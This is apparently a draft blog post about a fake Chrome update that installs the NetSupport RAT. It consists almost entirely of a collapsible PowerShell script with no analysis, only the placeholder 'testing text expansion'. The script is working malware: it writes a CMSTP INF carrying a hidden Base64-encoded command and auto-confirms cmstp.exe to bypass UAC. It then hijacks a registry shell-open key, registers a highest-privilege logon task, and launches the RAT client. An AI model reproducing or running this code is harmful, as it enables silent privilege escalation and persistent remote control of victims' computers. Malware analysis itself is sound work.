---
layout: post
title: "Google Chrome Update? More Like Infected With Netsupport Rat!​"
categories: blog
---

testing text expansion



<details>
	<summary>Click to expand</summary>
	
	~~~ powershell
	Add-Type -Name ConsoleUtils -Namespace WPIA -MemberDefinition @'
[DllImport("user32.dll")]
public static extern int PostMessage(int hWnd, uint Msg, int wParam, int lParam);
public const int WM_CHAR = 0x0100;
'@
Function script:Set-INFFile 
{[CmdletBinding()]Param ($InfFileLocation = "$env:temp\CMSTP.inf",[String]$CommandToExecute = 'powershell.exe -ExecutionPolicy unrestricted -WindowStyle hid
        den -Encoded " UgBFAEcAIABBAGQAZAAgACIASABLAEUAWQBfAEMATABBAFMAUwBFAFMAXwBSAE8ATwBUAFwAQwBMAFMASQBEAFwAewA2ADQANQBGAEYAMAA0ADAALQA1ADAAOAAxAC0AMQAwADEAQgAtADkARgAwADgALQAwADAAQQANAAoAIAAgACAAIAAgACAAIAAgAEEAMAAwADIARgA5ADUANABFAH0AXABzAGgAZQBsAGwAXABvAHAAZQBuAFwAYwBvAG0AbQBhAG4AZAAiACAALwBmACAALwB2AGUAIAAvAHQAIABSAEUARwBfAFMAWgAgAC8AZAAgAFoAOgBcAFcASQBOADEAMAAtAFIARQAtAFMAaABhAHIAZQBkAFwANwAtADIAOAAtADIAMwBcAEMAcgBlAGEAdABpAG8AbgBUAG8AbwBsAHMAXABjAGwAaQBlAG4AdAAzADIALgBlAHgAZQANAAoAIAAgACAAIAAgACAAIAAgACQAQQBjAHQAaQBvAG4AIAA9ACAAKABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIABaADoAXABXAEkATgAxADAALQBSAEUALQBTAGgAYQByAGUAZABcADcALQAyADgALQAyADMAXABDAHIAZQBhAHQAaQBvAG4AVABvAG8AbABzAFwAYwBsAGkAZQBuAHQAMwAyAC4AZQB4AGUAKQANAAoAIAAgACAAIAAgACAAIAAgACQAVAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0AQQB0AEwAbwBnAE8AbgANAAoAIAAgACAAIAAgACAAIAAgAFIAZQBnAGkAcwB0AGUAcgAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAtAFQAYQBzAGsATgBhAG0AZQAgACIAQgBhAGMAawBnAHIAbwB1AG4AZABDAGgAZQBjAGsAIgAgAC0AQQBjAHQAaQBvAG4AIAAkAEEAYwB0AGkAbwBuACAALQBUAHIAaQBnAGcAZQByACAAJABUAHIAaQBnAGcAZQByACAALQBSAHUAbgBMAGUAdgBlAGwAIAAiAEgAQwBoAGUAYwBrAFAAYQB0AGgAXwBVAG4AegBpAHAAZQBzAHQADQAKACAAIAAgACAAIAAgACAAIAAiACAALQBGAG8AcgBjAGUADQAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAWgA6AFwAVwBJAE4AMQAwAC0AUgBFAC0AUwBoAGEAcgBlAGQAXAA3AC0AMgA4AC0AMgAzAFwAQwByAGUAYQB0AGkAbwBuAFQAbwBvAGwAcwBcAGMAbABpAGUAbgB0ADMAMgAuAGUAeABlAA=="')$InfContent=@"
[version]
Signature =`$chicago`$
AdvancedINF = 2.5
[DefaultInstall]
CustomDestination = CustInstDestSectionAllUsers
RunPreSetupCommands = RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
;
            
$CommandToExecute
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="Notepad"
ShortSvcName="Notepad"
"@;$InfContent | Out-File $InfFileLocation -Encoding ASCII
}

Function Get-Hwnd
{[CmdletBinding()]Param([Parameter(Mandatory=$True,ValueFromPipelineByPropertyName=$True)][string]$ProcessName)Process{$ErrorActionPreference='Stop'

Try
    {
        $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
    }
Catch
    {
        $hwnd=$null
    }
$hash=@{ProcessName=$ProcessName;Hwnd=$hwnd}
New-Object -TypeName PsObject -Property $hash}
}

function Set-WindowActive
{[CmdletBinding()]Param([Parameter(Mandatory=$True,ValueFromPipelineByPropertyName=$True)][string]$Name)Process{$hwnd=Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd;[int]$handle=$hwnd;if($handle -gt 0){[void][WPIA.ConsoleUtils]::PostMessage($handle,[WPIA.ConsoleUtils]::WM_CHAR,13,0)}$hash=@{Process=$Name;Hwnd=$hwnd};New-Object -TypeName PsObject -Property $hash}}

Set-INFFile
add-type -AssemblyName System.Windows.Forms

If(Test-Path $InfFileLocation)
    {
        Start-Process cmstp -ArgumentList "/au ""$InfFileLocation""" -WindowStyle Minimized
        do{}until((Set-WindowActive cmstp).Hwnd -ne 0)
    }


	~~~
</details>